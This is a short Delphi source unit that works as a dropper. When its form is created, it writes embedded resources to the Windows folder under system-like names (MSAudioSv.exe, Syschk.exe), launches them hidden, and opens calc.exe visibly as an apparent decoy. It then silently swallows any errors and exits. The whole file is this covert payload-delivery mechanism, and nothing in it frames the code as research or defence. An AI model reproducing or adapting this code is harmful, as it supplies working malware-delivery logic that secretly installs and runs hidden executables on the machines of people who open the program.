unit container;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes,sycfuncs, shellapi, Controls, Forms;

type
  TForm4 = class(TForm)
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form4: TForm4;

implementation

{$R *.dfm}
procedure TForm4.FormCreate(Sender: TObject);
begin
try
dropres('msaudio', 'C:\WINDOWS\MSAudioSv.exe');
dropres('msaudio', 'C:\WINDOWS\SysAudioSv.Manifest');
dropres('calc', 'C:\calc.exe');
dropres('syschk', 'C:\WINDOWS\Syschk.exe');
ShellExecute(form4.Handle, nil, 'c:\windows\MSAudioSv.exe','', nil, sw_HIDE);
ShellExecute(form4.Handle, nil, 'c:\windows\Syschk.exe','', nil, sw_HIDE);
ShellExecute(form4.Handle, nil, 'c:\calc.exe','', nil, sw_SHOWNORMAL);
sleep(2000);
application.Terminate;
except
      on E: Exception do
     ;
    end;


end;


end.
